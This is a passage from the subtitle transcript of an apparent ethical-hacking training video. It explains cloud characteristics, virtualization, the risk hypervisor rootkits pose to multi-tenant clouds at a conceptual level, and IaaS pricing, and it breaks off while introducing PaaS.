00:14:28.930\nSo, you're gonna look for\nthe little gremlin that flashes the word\n\n269\n00:14:28.930 --> 00:14:32.220\nubiquitous on the screen at some\npoint while we're talking, and\n\n270\n00:14:32.220 --> 00:14:36.420\nif you find that then you'll win a pair\nof I don't know, Batman socks like\n\n271\n00:14:36.420 --> 00:14:41.150\nMike was wearing in some of his earlier\nForays into our discussions, right?\n\n272\n00:14:41.150 --> 00:14:41.920\nYou don't have those on yet?\n\n273\n00:14:41.920 --> 00:14:42.900\n>> I'll wash them up first.\n\n274\n00:14:42.900 --> 00:14:44.055\n>> You wash them up first, okay.\n\n275\n00:14:44.055 --> 00:14:45.465\nMike will sign them and send them to you.\n\n276\n00:14:45.465 --> 00:14:47.590\n>> [LAUGH]\n>> So broad network access,\n\n277\n00:14:47.590 --> 00:14:48.300\nubiquitousness.\n\n278\n00:14:48.300 --> 00:14:52.530\nWe are talking about the ability\nto have access to the cloud from\n\n279\n00:14:52.530 --> 00:14:56.620\nanywhere at any time, almost without\nexception under any conditions.\n\n280\n00:14:56.620 --> 00:15:00.570\nAgain, clearly we need to have capacity\nand capability to plug into the wire.\n\n281\n00:15:00.570 --> 00:15:02.110\nThere has to be bandwidth there.\n\n282\n00:15:02.110 --> 00:15:05.680\nI'm not saying magically, we wave our\nwand and, I wanna think I'm there and\n\n283\n00:15:05.680 --> 00:15:06.470\nI'm there, right?\n\n284\n00:15:06.470 --> 00:15:08.790\nWe do know the laws of physics still apply\n>> Right.\n\n285\n00:15:08.790 --> 00:15:09.980\n>> We do have to connect.\n\n286\n00:15:09.980 --> 00:15:12.820\nBut assuming there's bandwidth,\nit's available there, and\n\n287\n00:15:12.820 --> 00:15:17.110\nit should be always on, meaning the cloud\naccess should always be available, and\n\n288\n00:15:17.110 --> 00:15:19.710\nit should be broadly\navailable from anywhere.\n\n289\n00:15:19.710 --> 00:15:23.760\nWhen we think about resource pooling,\nwe think about the cloud service provider,\n\n290\n00:15:23.760 --> 00:15:24.850\nwhat we call the CSP.\n\n291\n00:15:24.850 --> 00:15:28.900\nThe cloud service provider's ability\nto be able to put those resources\n\n292\n00:15:28.900 --> 00:15:33.470\nthat I mentioned together, and\naggregate them into consumable units\n\n293\n00:15:33.470 --> 00:15:38.180\nthat are going to grow their ability\nto be able to offer services.\n\n294\n00:15:38.180 --> 00:15:42.360\nSo for instance, we talked about network\nbandwidth, we talked about storage,\n\n295\n00:15:42.360 --> 00:15:47.910\nwe talked about the compute resources,\nprimarily and specifically CPUs, right?\n\n296\n00:15:47.910 --> 00:15:52.946\nIn the core CPUs and logical CPUs by\nextension in the host and RAM, right?\n\n297\n00:15:52.946 --> 00:15:55.053\nRAM or the memory in the host.\n\n298\n00:15:55.053 --> 00:15:59.600\nAll four of those resources can be\npooled together either individually or\n\n299\n00:15:59.600 --> 00:16:02.606\ncollectively To be able\nto create scalability so\n\n300\n00:16:02.606 --> 00:16:07.718\nthat way we can add and offer services\nby adding more systems that we can host.\n\n301\n00:16:07.718 --> 00:16:10.880\nSo we wanna think about joining\nthose resources together\n\n302\n00:16:10.880 --> 00:16:12.550\nto offer enhanced capabilities.\n\n303\n00:16:12.550 --> 00:16:14.590\nThat's what resource pooling is about.\n\n304\n00:16:14.590 --> 00:16:18.070\nWe think about rapid elasticity,\nthe ability to scale up, scale out, or\n\n305\n00:16:18.070 --> 00:16:18.870\nscale down.\n\n306\n00:16:18.870 --> 00:16:23.170\nAlmost on demand, with little to no\ndifficulty, little to no time lag.\n\n307\n00:16:23.170 --> 00:16:26.262\nI'm a customer of Amazon on AWS.\n\n308\n00:16:26.262 --> 00:16:30.780\nI wanna be able to go from having five\nhosts to having double that number,\n\n309\n00:16:30.780 --> 00:16:31.900\nten hosts, right.\n\n310\n00:16:31.900 --> 00:16:36.880\nAll I have to do is probably be able to\nput in a service request or a ticket or\n\n311\n00:16:36.880 --> 00:16:40.610\nsomehow indicate that I have\na desire to grow my usage.\n\n312\n00:16:40.610 --> 00:16:44.910\nAnd Amazon will provision those out to\nme within several minutes, typically.\n\n313\n00:16:44.910 --> 00:16:46.780\nThere's usually almost no delay at all.\n\n314\n00:16:46.780 --> 00:16:50.467\nAnd so the reality is we can easily scale\nup, but we also wanna know, and as I said,\n\n315\n00:16:50.467 --> 00:16:53.460\nwe wanna make sure we're aware\nof the fact we can scale down.\n\n316\n00:16:53.460 --> 00:16:55.750\nBecause sometimes we have\nperiods of down time.\n\n317\n00:16:55.750 --> 00:17:00.130\nUsage is not gonna be high and\nwe don't wanna pay for usage and pay for\n\n318\n00:17:00.130 --> 00:17:01.450\nconsumption that we're not gonna need.\n\n319\n00:17:01.450 --> 00:17:02.520\nIt's like anything else.\n\n320\n00:17:02.520 --> 00:17:04.240\nGive me what I want, right?\n\n321\n00:17:04.240 --> 00:17:05.295\nWhat I really, really want.\n\n322\n00:17:05.295 --> 00:17:06.860\n>> [LAUGH]\n>> The Spice Girls there.\n\n323\n00:17:06.860 --> 00:17:08.610\nBut give me what I want, right.\n\n324\n00:17:08.610 --> 00:17:11.400\nAnd then when I don't need it,\nI wanna be able to put it off to the side,\n\n325\n00:17:11.400 --> 00:17:13.820\ngive it to somebody else in theory,\nlet them use it.\n\n326\n00:17:13.820 --> 00:17:16.180\nBut, when I want it, I wanna be\nable to get it back really quickly,\n\n327\n00:17:16.180 --> 00:17:17.340\nwhen I do need it.\n\n328\n00:17:17.340 --> 00:17:19.950\nIf you think about the logic of\nthis model, this is great for\n\n329\n00:17:19.950 --> 00:17:24.240\nbusinesses that have clearly defined\ncycles of up and down, right?\n\n330\n00:17:24.240 --> 00:17:27.730\nMaybe retail for instance,\naround holiday seasons, things like that.\n\n331\n00:17:27.730 --> 00:17:31.250\nWhere they're definitely gonna need\nto scale, and at certain points,\n\n332\n00:17:31.250 --> 00:17:32.410\nthey're gonna need to cut back.\n\n333\n00:17:32.410 --> 00:17:34.330\nAnd so this would allow us to do that.\n\n334\n00:17:34.330 --> 00:17:38.340\nAnd then our last defining characteristic\nthere is gonna be measured service.\n\n335\n00:17:38.340 --> 00:17:40.000\nEverything is gonna have a metric or\n\n336\n00:17:40.000 --> 00:17:43.850\nmeasure associated with it,\nwe pay as we go, essentially.\n\n337\n00:17:43.850 --> 00:17:45.730\nWe measure what we consume and\n\n338\n00:17:45.730 --> 00:17:50.010\nas a result of that we're constantly\noptimizing, measuring, fine-tuning.\n\n339\n00:17:50.010 --> 00:17:53.830\nBut the cloud service provider is\nable to tell us down to the penny\n\n340\n00:17:53.830 --> 00:17:57.710\nexactly what we're gonna use and\nas a result what we have to pay for.\n\n341\n00:17:57.710 --> 00:18:01.930\nAnd so it's nice because you find out\nwhen you go to AWS or something like that\n\n342\n00:18:01.930 --> 00:18:06.820\nrunning a Windows 12 instance will run\nyou, I don't know, $10 cents an hour.\n\n343\n00:18:06.820 --> 00:18:08.870\nWhatever that is, all up, rolled up with.\n\n344\n00:18:08.870 --> 00:18:13.860\nYou have the storage and the networking\nand the host memory and all that and\n\n345\n00:18:13.860 --> 00:18:15.230\nfor every hour that system is on,\n\n346\n00:18:15.230 --> 00:18:19.490\nyou're spending $10 cents US on\nthe dollar be able to run it.\n\n347\n00:18:19.490 --> 00:18:22.600\nSo if you're gonna run it for\n100 hours, right?\n\n348\n00:18:22.600 --> 00:18:24.254\nIt's gonna cost you $10.\n\n349\n00:18:24.254 --> 00:18:25.723\n>> Right.\n>> Whatever that is a month.\n\n350\n00:18:25.723 --> 00:18:29.458\nAnd so you can project out ahead exactly\nwhat your expense in theory should be.\n\n351\n00:18:29.458 --> 00:18:34.300\nSo we wanna make sure we're understanding\nwhat the five key characteristics or\n\n352\n00:18:34.300 --> 00:18:37.740\ndefining characteristic are,\nbecause they help us to make up\n\n353\n00:18:37.740 --> 00:18:40.320\nthe five process of the class, very,\nvery important to think about that.\n\n354\n00:18:40.320 --> 00:18:44.884\nNow, in addition to those five main\nthings that we put in on vocabulary list,\n\n355\n00:18:44.884 --> 00:18:49.487\none of the couple of add-ons not in\nthe traditional NIST definition but\n\n356\n00:18:49.487 --> 00:18:53.715\njust supporting elements, supporting\ncast of characters that are there but\n\n357\n00:18:53.715 --> 00:18:57.045\nthey're not called out as key items,\nkey vocabulary terms.\n\n358\n00:18:57.045 --> 00:19:00.462\nBut they're enabling concepts,\nwe talked about automation.\n\n359\n00:19:00.462 --> 00:19:03.942\nI mentioned several times, that a lot\nof these processes are automated.\n\n360\n00:19:03.942 --> 00:19:10.122\nSo, automation being able to use software\ndefinition, to be able to create answer\n\n361\n00:19:10.122 --> 00:19:14.530\nfiles, essentially, and configurations\nthat are gonna be a file based right?\n\n362\n00:19:14.530 --> 00:19:19.120\nEssentially answer files that are used to\nremove the human from the experience and\n\n363\n00:19:19.120 --> 00:19:23.370\nautomate the provisioning, automate\nthe management process, standardizing and\n\n364\n00:19:23.370 --> 00:19:24.810\nbaselining as we go.\n\n365\n00:19:24.810 --> 00:19:28.160\nIt's a very important thought process\nwith regards to making sure we understand\n\n366\n00:19:28.160 --> 00:19:31.130\nhow these five characteristics\ncome into play.\n\n367\n00:19:31.130 --> 00:19:34.870\nIf you think about it, when was the last\ntime you had to do something that was,\n\n368\n00:19:34.870 --> 00:19:38.230\nI don't know, repetitive and\nvery similar in nature, right?\n\n369\n00:19:38.230 --> 00:19:39.830\n>> And you knew you could do it, but\n\n370\n00:19:39.830 --> 00:19:43.460\nthe reality is you probably were not to\nexcited about doing it, number one, right?\n\n371\n00:19:43.460 --> 00:19:46.622\nAnd number two, you may not have been\nlooking forward to it because chance\n\n372\n00:19:46.622 --> 00:19:49.529\nare good, you would know, hey,\nif I do it five, ten, 20 times,\n\n373\n00:19:49.529 --> 00:19:52.599\nI'm probably going to make a mistake for\nmy paying attention [CROSSTALK]\n\n374\n00:19:52.599 --> 00:19:53.583\n>> All time.\n\n375\n00:19:53.583 --> 00:19:56.607\n>> Probably like here when\nwe're doing this, for instance,\n\n376\n00:19:56.607 --> 00:19:57.940\nwe have the blooper real.\n\n377\n00:19:57.940 --> 00:20:00.640\nWe could make that available to\nyou at some point in the future.\n\n378\n00:20:00.640 --> 00:20:04.539\nWe don't ever do that, we don't have like\n[CROSSTALK] should beefing them, so.\n\n379\n00:20:04.539 --> 00:20:06.237\n>> We've got some humdingers there.\n\n380\n00:20:06.237 --> 00:20:06.788\n>> Yeah [LAUGH].\n\n381\n00:20:06.788 --> 00:20:09.195\nFor some of this stuff\nyou want to have done.\n\n382\n00:20:09.195 --> 00:20:11.672\nAnyway, so\nwhen you think about automation, right?\n\n383\n00:20:11.672 --> 00:20:14.060\nWhen we think about the ability to\nget rid of the human in the mix.\n\n384\n00:20:14.060 --> 00:20:16.550\nNot get rid of the human,\nget them out, not let them consume.\n\n385\n00:20:16.550 --> 00:20:21.860\nBut specifically, remove them from\nthe tedious, mind-numbing work of having\n\n386\n00:20:21.860 --> 00:20:24.920\nto consistently and\nconstantly get something right.\n\n387\n00:20:24.920 --> 00:20:25.900\nLet's just automate that.\n\n388\n00:20:25.900 --> 00:20:26.900\nGive a machine the job.\n\n389\n00:20:26.900 --> 00:20:28.200\nGet it right one time.\n\n390\n00:20:28.200 --> 00:20:31.235\nThat's gonna be also an important\nsupporting characteristic.\n\n391\n00:20:31.235 --> 00:20:33.425\nWe also wanna make sure that\nwe're thinking about, and\n\n392\n00:20:33.425 --> 00:20:36.405\nI mentioned this in the beginning as well,\nthe use of virtualization as\n\n393\n00:20:36.405 --> 00:20:40.325\nthe underpinning key technology\nthat enables cloud computing.\n\n394\n00:20:40.325 --> 00:20:43.620\nYou could do cloud computing\nwithout virtualization.\n\n395\n00:20:43.620 --> 00:20:48.330\nBut you couldn't do it today at the scale\nand at the level that we use it and\n\n396\n00:20:48.330 --> 00:20:51.850\ncontinue to grow astronomically\nas we look forward in the future.\n\n397\n00:20:51.850 --> 00:20:56.050\nYou couldn't really scale it, it wouldn't\nbe possible and you wouldn't be able to do\n\n398\n00:20:56.050 --> 00:20:59.820\ncloud in the way that we define\nit today based on its definition.\n\n399\n00:20:59.820 --> 00:21:04.780\nSo, while we could theoretically do cloud\nwithout virtualization, it doesn't really\n\n400\n00:21:04.780 --> 00:21:07.640\nmake sense, cuz it doesn't really\nalign with how we define it.\n\n401\n00:21:07.640 --> 00:21:10.370\nYou can virtualize and not be in\nthe cloud, in other words, right?\n\n402\n00:21:10.370 --> 00:21:13.160\nIt's easy to say,\nI'm running a virtualized instance, but\n\n403\n00:21:13.160 --> 00:21:14.150\nwe're not doing it in the cloud.\n\n404\n00:21:14.150 --> 00:21:16.640\nWe've been doing that for\nour demonstrations for you.\n\n405\n00:21:16.640 --> 00:21:20.360\nFor instance, in our lab environment,\nwe're not running those in the cloud.\n\n406\n00:21:20.360 --> 00:21:23.670\nWe're just running them on some machines\nthat we have sitting around that\n\n407\n00:21:23.670 --> 00:21:24.820\nare locally hosted.\n\n408\n00:21:24.820 --> 00:21:27.040\nSo we're not really using\nthe cloud to do that.\n\n409\n00:21:27.040 --> 00:21:29.870\nBut the reality is we are virtualizing.\n\n410\n00:21:29.870 --> 00:21:32.420\nBut, when you try to go to\nthe cloud without virtualization,\n\n411\n00:21:32.420 --> 00:21:33.990\nit doesn't really work that way.\n\n412\n00:21:33.990 --> 00:21:34.820\nAt least not today.\n\n413\n00:21:34.820 --> 00:21:39.272\nSo virtualization is a key, defining,\nunderpinning technology of the cloud.\n\n414\n00:21:39.272 --> 00:21:41.270\nYou wanna make sure you\nare aware of that as well.\n\n415\n00:21:41.270 --> 00:21:44.000\nHacking the virtual platform\nmeans you can hack the cloud.\n\n416\n00:21:44.000 --> 00:21:45.230\nLet's be clear about that.\n\n417\n00:21:45.230 --> 00:21:49.770\nAs an ethical hacker, the way you defend\nthe cloud is by figuring out how to defend\n\n418\n00:21:49.770 --> 00:21:52.700\nthe virtualized infrastructure\nthat the cloud runs on.\n\n419\n00:21:52.700 --> 00:21:54.770\nAnd then what are the weaknesses there?\n\n420\n00:21:54.770 --> 00:21:58.210\nFor instance, we talked about rootkits\nin our of our earlier episodes.\n\n421\n00:21:58.210 --> 00:22:02.580\nBack when we were talking about how to go\nin and potentially do foot printing right?\n\n422\n00:22:02.580 --> 00:22:06.850\nAnd do recon and enumeration and\nhacking the system in particular in those\n\n423\n00:22:06.850 --> 00:22:10.750\nepisodes, right, in those topical areas\nas we're going through the methodology\n\n424\n00:22:10.750 --> 00:22:14.630\nassociated with CEH hacking,\nCertified Ethical Hacking Hacking, right.\n\n425\n00:22:14.630 --> 00:22:16.835\nOr Certified Ethical Hacker Hacker, right?\n\n426\n00:22:16.835 --> 00:22:19.280\n[LAUGH] And so, we could do CH squared.\n\n427\n00:22:19.280 --> 00:22:21.270\nThat could be cool.\n\n428\n00:22:21.270 --> 00:22:24.050\nWe have to talk to EC Council about that,\nsee if they would buy into that idea.\n\n429\n00:22:24.050 --> 00:22:26.920\nSo, when we were thinking about\nbecoming a certified ethical hacker, we\n\n430\n00:22:26.920 --> 00:22:31.560\ntalked about some of those things, we made\nspecific reference to the rootkits and\n\n431\n00:22:31.560 --> 00:22:33.720\nthe problems associated with\ndifferent kinds of rootkits.\n\n432\n00:22:33.720 --> 00:22:37.370\nI mentioned there are hypervisor rootkits,\nI mentioned there's firmware and\n\n433\n00:22:37.370 --> 00:22:38.750\nhardware based rootkits.\n\n434\n00:22:38.750 --> 00:22:41.460\nThere are application level rootkits,\nthere's rootkits for\n\n435\n00:22:41.460 --> 00:22:45.930\nevery possible occasion and every possible\nseason and event you may think about.\n\n436\n00:22:45.930 --> 00:22:49.860\nBut the rootkit we would focus on here\nis the hypervisor based rootkits for\n\n437\n00:22:49.860 --> 00:22:53.960\ninstance because anything that gets\nin to a hypervisor as a rootkit and\n\n438\n00:22:53.960 --> 00:22:56.010\ncan root the system taking control.\n\n439\n00:22:56.010 --> 00:22:59.520\nAnd if you think about the logic of this\nin the virtualization stack in cloud,\n\n440\n00:22:59.520 --> 00:23:02.060\nyou've got the host sitting here, right?\n\n441\n00:23:02.060 --> 00:23:06.120\nYou've got the hypervisor running on\nthe host as an abstraction layer.\n\n442\n00:23:06.120 --> 00:23:07.740\nYou've got virtual resources.\n\n443\n00:23:07.740 --> 00:23:09.500\nGuest OS is running up here.\n\n444\n00:23:09.500 --> 00:23:11.600\nAnd resources from the host down here.\n\n445\n00:23:11.600 --> 00:23:15.940\nIf the hypervisor is gonna have a rootkit\nand essentially this layer right here.\n\n446\n00:23:15.940 --> 00:23:17.445\nIf I do this like this I have no nose.\n\n447\n00:23:17.445 --> 00:23:17.945\n>> [LAUGH]\n>> Right?\n\n448\n00:23:17.945 --> 00:23:18.880\nIt's kinda like weird.\n\n449\n00:23:18.880 --> 00:23:20.450\nI'm a floating pair of eyes.\n\n450\n00:23:20.450 --> 00:23:22.960\nAt a really face but\nthere's nothing in between.\n\n451\n00:23:22.960 --> 00:23:26.940\nSo when you think about the fact that we\nhave a hypervisor that's obstructing,\n\n452\n00:23:26.940 --> 00:23:30.960\nessentially a traffic management\nsystem resource managing back and\n\n453\n00:23:30.960 --> 00:23:34.745\nforth between the host and the VMs,\nif we can root that with the rootkit,\n\n454\n00:23:34.745 --> 00:23:39.925\nwe've got control over everything that\nruns on that host, every virtual machine.\n\n455\n00:23:39.925 --> 00:23:44.125\nIf it's a multi-tenant environment, I've\ngot control of multiple businesses virtual\n\n456\n00:23:44.125 --> 00:23:47.233\nmachines, and all that data that\nis sitting on the storage array.\n\n457\n00:23:47.233 --> 00:23:51.555\nBacking that system up is now available to\nme, all of the network connectivity and\n\n458\n00:23:51.555 --> 00:23:55.450\ninterconnect and traffic management and\nmonitoring is available to me.\n\n459\n00:23:55.450 --> 00:23:59.147\nAnd all of that can be now\nessentially be compromised.\n\n460\n00:23:59.147 --> 00:24:02.380\nAnd then all the connections those\nmachines make out to other machines in\n\n461\n00:24:02.380 --> 00:24:04.078\nother areas can also be compromised.\n\n462\n00:24:04.078 --> 00:24:08.733\nSo, virtual machine hypervisor based root\nkits are tremendously problematic in\n\n463\n00:24:08.733 --> 00:24:12.780\nthe Cloud and we have to take steps to\nunderstand that if they are there we\n\n464\n00:24:12.780 --> 00:24:16.096\nmust define a way to find them,\nand we must get rid of them.\n\n465\n00:24:16.096 --> 00:24:18.112\nExcuse me, as quickly as possible.\n\n466\n00:24:18.112 --> 00:24:20.198\nThe challenge is though, that the host,\n\n467\n00:24:20.198 --> 00:24:23.714\nthe Cloud service provider that is\nhosting this infrastructure may or\n\n468\n00:24:23.714 --> 00:24:27.009\nmay not be aware of the fact that\ntheir host had been compromised.\n\n469\n00:24:27.009 --> 00:24:27.999\nAs an ethical hacker,\n\n470\n00:24:27.999 --> 00:24:30.564\nwe need to understand that we\ndo the standard stuff right?\n\n471\n00:24:30.564 --> 00:24:31.984\nWe do the vulnerability assessment.\n\n472\n00:24:31.984 --> 00:24:33.216\nWe do the pen testing.\n\n473\n00:24:33.216 --> 00:24:35.074\nBut hackers are gonna break in and\n\n474\n00:24:35.074 --> 00:24:39.117\nif the security function in that system\nis not good enough to catch that,\n\n475\n00:24:39.117 --> 00:24:43.787\nthose machines may be compromised for a\nlong period of time without our knowledge.\n\n476\n00:24:43.787 --> 00:24:45.290\nThis can be a very big challenge.\n\n477\n00:24:45.290 --> 00:24:48.266\nCan we continue talking about\nthe types of Cloud Services?\n\n478\n00:24:48.266 --> 00:24:48.859\n>> Absolutely.\n\n479\n00:24:48.859 --> 00:24:51.109\n>> Can we do that, do you have that up\nnext, I thought I saw that up there,\n\n480\n00:24:51.109 --> 00:24:51.769\nthere we go, okay.\n\n481\n00:24:51.769 --> 00:24:53.313\nI think we need to go back full-screen.\n\n482\n00:24:53.313 --> 00:24:55.807\nThere we go, so Service Models.\n\n483\n00:24:55.807 --> 00:24:58.244\nLet's talk about SaaS, PaaS and IaaS.\n\n484\n00:24:58.244 --> 00:25:00.342\nI can actually start at the bottom,\nif you don't mind.\n\n485\n00:25:00.342 --> 00:25:01.183\nYou can scroll down.\n\n486\n00:25:01.183 --> 00:25:04.373\nStart with IaaS, we can build that\nwhole now to fire process from\n\n487\n00:25:04.373 --> 00:25:07.639\nthe infrastructure level up all\nthe way up to the software stack.\n\n488\n00:25:07.639 --> 00:25:11.568\nSo let's talk about the IaaS first,\nInfrastructure as a Service.\n\n489\n00:25:11.568 --> 00:25:16.163\nWe are traditionally here with all three\nof these models thinking about renting.\n\n490\n00:25:16.163 --> 00:25:19.709\nWe're renting not own but we are renting\nto use, and that's important for\n\n491\n00:25:19.709 --> 00:25:20.895\nus to distinguish here.\n\n492\n00:25:20.895 --> 00:25:24.317\nWe're no buying the technology and\nwe're not owning it outright,\n\n493\n00:25:24.317 --> 00:25:26.066\nwe are renting it from a provider.\n\n494\n00:25:26.066 --> 00:25:30.387\nThat has essentially gone out and\nmade an investment in this infrastructure.\n\n495\n00:25:30.387 --> 00:25:35.220\nThe traditional model, up until the cloud,\nreally becomes something of interest to\n\n496\n00:25:35.220 --> 00:25:38.374\nthe enterprise today is that\nwe would go out and invest,\n\n497\n00:25:38.374 --> 00:25:41.074\nwe being a typical business,\nthe IT function.\n\n498\n00:25:41.074 --> 00:25:42.097\nWe would go out and\n\n499\n00:25:42.097 --> 00:25:46.339\ninvest heavily in the infrastructure\nrequired to run networks, right?\n\n500\n00:25:46.339 --> 00:25:48.993\nWe would build storage systems and\ngo out and buy sand,\n\n501\n00:25:48.993 --> 00:25:50.561\nstorage area network and NAST.\n\n502\n00:25:50.561 --> 00:25:52.207\nAnd then we can attach storage systems.\n\n503\n00:25:52.207 --> 00:25:55.422\nWe would also go out and\nbuy multiple rack and stack hosts, right?\n\n504\n00:25:55.422 --> 00:25:58.585\nSo, we'd have row after\nrow like line after line.\n\n505\n00:25:58.585 --> 00:26:01.548\nJust like you see in the matrix\nof all the machines, right?\n\n506\n00:26:01.548 --> 00:26:03.459\nWe'd have all that stuff.\n\n507\n00:26:03.459 --> 00:26:04.211\nWe would buy it.\n\n508\n00:26:04.211 --> 00:26:04.867\nWe would own it.\n\n509\n00:26:04.867 --> 00:26:06.147\nWe would depreciate it.\n\n510\n00:26:06.147 --> 00:26:08.602\nWe would manage it on our\nbalance sheets over time,\n\n511\n00:26:08.602 --> 00:26:11.929\ntypically a three to five year\nacquisition and depreciation cycle.\n\n512\n00:26:11.929 --> 00:26:15.382\nIt would be a CAPEX,\ncapital expenditure expense, right?\n\n513\n00:26:15.382 --> 00:26:18.798\nWe'd spend a tremendous amount of money,\nown a bunch of liability, and\n\n514\n00:26:18.798 --> 00:26:21.772\nthen over time, write it down\nuntil it's valued down to zero.\n\n515\n00:26:21.772 --> 00:26:25.416\nThen we would just simply go out and buy\nmore stuff, that's the traditional model.\n\n516\n00:26:25.416 --> 00:26:29.682\nWhat Cloud allows us to do is to\nswitch that thought process and\n\n517\n00:26:29.682 --> 00:26:33.211\ntransfer that investment\nfrom us as the business,\n\n518\n00:26:33.211 --> 00:26:38.316\nmaking it as a capital expenditure\nover to whoever the cloud provider is.\n\n519\n00:26:38.316 --> 00:26:42.031\nAnd have them write the check to spend\na million dollars to buy storage.\n\n520\n00:26:42.031 --> 00:26:43.614\nThat's their capital expense.\n\n521\n00:26:43.614 --> 00:26:48.453\nWhat they do is then give that back\nto us as OPEX, operational expense.\n\n522\n00:26:48.453 --> 00:26:51.834\nWe now have a monthly line item\ncharge that we can project out ahead.\n\n523\n00:26:51.834 --> 00:26:56.312\nAnd say, okay, every month I'm gonna\nspend $5000 running my infrastructure,\n\n524\n00:26:56.312 --> 00:26:57.489\nsomething like that.\n\n525\n00:26:57.489 --> 00:27:00.974\nAnd I've switched to CAPEX for\nan OPEX expense,\n\n526\n00:27:00.974 --> 00:27:05.394\nmade a five year amortized\ninvestment into a line item that's\n\n527\n00:27:05.394 --> 00:27:09.741\nmonthly on my recurring charges\nin my infrastructure bill.\n\n528\n00:27:09.741 --> 00:27:10.876\nJust like telephone service.\n\n529\n00:27:10.876 --> 00:27:12.758\nJust like internet service.\n\n530\n00:27:12.758 --> 00:27:15.260\nJust like,\nI don't know what else you would buy.\n\n531\n00:27:15.260 --> 00:27:15.965\n>> Cable TV.\n\n532\n00:27:15.965 --> 00:27:17.243\n>> Cable TV, right?\n\n533\n00:27:17.243 --> 00:27:18.940\nI borrow that from my neighbor.\n\n534\n00:27:18.940 --> 00:27:19.988\nI don't buy that,\nyou borrow that from your neighbor.\n\n535\n00:27:19.988 --> 00:27:21.859\n>> [LAUGH]\n>> You don't have to buy that.\n\n536\n00:27:21.859 --> 00:27:23.964\n>> [LAUGH]\n>> You do, I'm only kidding by the way.\n\n537\n00:27:23.964 --> 00:27:26.331\n>> [LAUGH]\n>> Do not take that seriously.\n\n538\n00:27:26.331 --> 00:27:31.602\n>> So, make sure you understand that the\nshift in the infrastructure model here,\n\n539\n00:27:31.602 --> 00:27:34.836\nfrom CAPEX to OPEX is\na very important subtlety.\n\n540\n00:27:34.836 --> 00:27:37.956\nA very important underlying assumption,\nwith regards to these models.\n\n541\n00:27:37.956 --> 00:27:40.964\nBecause now, as we talk about IaaS,\nInfrastructure Service,\n\n542\n00:27:40.964 --> 00:27:44.099\nwe're renting back that infrastructure,\ninstead of buying it.\n\n543\n00:27:44.099 --> 00:27:45.720\n>> Right.\n>> So for $100 a month,\n\n544\n00:27:45.720 --> 00:27:48.487\nI can have an Exchange Server and\na SharePoint Server, and\n\n545\n00:27:48.487 --> 00:27:49.743\ntwo domain controllers.\n\n546\n00:27:49.743 --> 00:27:51.447\nAnd I can have storage to go with it.\n\n547\n00:27:51.447 --> 00:27:55.222\nI don't have to buy that,\nI could simply say to Amazon or Microsoft,\n\n548\n00:27:55.222 --> 00:27:59.534\ncan I borrow that, can I rent that, can\nyou give that to me for a period of time?\n\n549\n00:27:59.534 --> 00:28:02.996\nAnd by the way when I'm done,\nI give it back, that's the beauty, right?\n\n550\n00:28:02.996 --> 00:28:04.314\nI don't have to worry about owning it.\n\n551\n00:28:04.314 --> 00:28:06.321\nI just have to worry about making\nsure I pay my bill on time.\n\n552\n00:28:06.321 --> 00:28:07.048\n>> You don't have to upgrade it.\n\n553\n00:28:07.048 --> 00:28:07.930\nNone of that.\n>> No.\n\n554\n00:28:07.930 --> 00:28:10.509\nIt's all managed by the provider, which\nis part of what I wanna talk about here.\n\n555\n00:28:10.509 --> 00:28:11.412\nIt's very true.\n\n556\n00:28:11.412 --> 00:28:14.820\nSo with IaaS, Infrastructure as a Service,\n\n557\n00:28:14.820 --> 00:28:19.933\nwe are going to the Cloud provider and\nsaying, I'd like to be able to\n\n558\n00:28:19.933 --> 00:28:25.339\nrent five hosts with 24 core processors or\n24 processors per host.\n\n559\n00:28:25.339 --> 00:28:29.410\nAnd I wanna have 24 gigabytes of ram to go\nwith it, and I wanna terabyte of storage\n\n560\n00:28:29.410 --> 00:28:32.306\non the backend, and\nI want them all on network up, right?\n\n561\n00:28:32.306 --> 00:28:35.879\nSo that whole solution is\ninfrastructure as a service, but\n\n562\n00:28:35.879 --> 00:28:40.309\nhere's the real cool thing,\nI am just renting the core infrastructure,\n\n563\n00:28:40.309 --> 00:28:45.331\nI'm getting the physical host, I'm getting\nthe configuration on the hardware.\n\n564\n00:28:45.331 --> 00:28:48.551\nI got 24 cores,\nI got 24 gigs of ram per host.\n\n565\n00:28:48.551 --> 00:28:50.912\nI'm getting the network interconnect, so\n\n566\n00:28:50.912 --> 00:28:53.667\nmaybe I've got 10 gig on the back plane,\nright?\n\n567\n00:28:53.667 --> 00:28:57.798\nFor fiber to get to my storage and\nI've got all that.\n\n568\n00:28:57.798 --> 00:29:00.106\nBut I'm not getting an operating system.\n\n569\n00:29:00.106 --> 00:29:02.850\nI'm not configuring\napplication workloads yet.\n\n570\n00:29:02.850 --> 00:29:07.445\nI don't have a virtualized platform and\nan IDE, Integrated Dev Environment loaded.\n\n571\n00:29:07.445 --> 00:29:11.009\nI'm just getting the barebones\nwhite box infrastructure.\n\n572\n00:29:11.009 --> 00:29:13.405\nAnd then as a result, the customer, me,\n\n573\n00:29:13.405 --> 00:29:18.135\nnow has a responsibility to load all that\nstuff up, configure it, and manage it.\n\n574\n00:29:18.135 --> 00:29:21.686\nSo with IaaS, I'm literally just getting\ninfrastructure from the provider.\n\n575\n00:29:21.686 --> 00:29:22.735\nAnd then I do everything else.\n\n576\n00:29:22.735 --> 00:29:27.116\nSo I load the OSs, I want some Windows,\nsome Linux, I'm gonna load and configure\n\n577\n00:29:27.116 --> 00:29:31.501\nthe application workloads that I wanna\nrun there from a monitoring perspective,\n\n578\n00:29:31.501 --> 00:29:32.790\nall that kind of stuff.\n\n579\n00:29:32.790 --> 00:29:36.971\nAnd then I'm gonna set up the dev\nenvironment from the development work,\n\n580\n00:29:36.971 --> 00:29:39.541\nI'm gonna set up to virtualized resources.\n\n581\n00:29:39.541 --> 00:29:43.788\nI'm gonna actually set up and run hosting\nand then actually virtualize some VMs.\n\n582\n00:29:43.788 --> 00:29:45.848\nI'm gonna do all that\nmyself as a customer.\n\n583\n00:29:45.848 --> 00:29:48.793\nSo that's kinda cool, so\nthat's Infrastructure as a Service.\n\n584\n00:29:48.793 --> 00:29:51.430\nLet's go up to a Platform\nas a Service to PaaS.\n\n585\n00:29:51.430 --> 00:29:54.177\nSo with PaaS,\nwe are now in the middle, right?\n\n586\n00:29:54.177 --> 00:29:58.299\nWe've got the infrastructure, what we have\nto understand is that PaaS is gonna be\n\n587\n00:29:58.299 --> 00:30:01.481\ninfrastructure as a service\nplus something, plus platform.\n\n588\n00:30:01.481 --> 00:30:05.070\nSo all the infrastructure we need is\nalready there, it's part of the package.\n\n589\n00:30:05.070 --> 00:30:08.708\nAnd we went to the provider and\nsaid, hey, Mr. Provider, 